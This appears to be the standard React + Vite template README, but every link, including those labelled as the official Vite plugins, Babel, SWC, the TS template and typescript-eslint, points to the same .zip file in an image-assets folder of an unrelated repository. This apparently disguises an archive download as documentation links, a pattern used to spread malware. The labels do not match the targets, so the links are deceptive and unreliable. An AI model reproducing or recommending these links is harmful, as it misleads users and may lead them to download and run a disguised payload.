# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) uses [Babel](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) uses [SWC](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/Giant206/Web-Portofolio-React.js/main/src/assets/img-projects/React_js_Web_Portofolio_v2.9.zip) in your project.
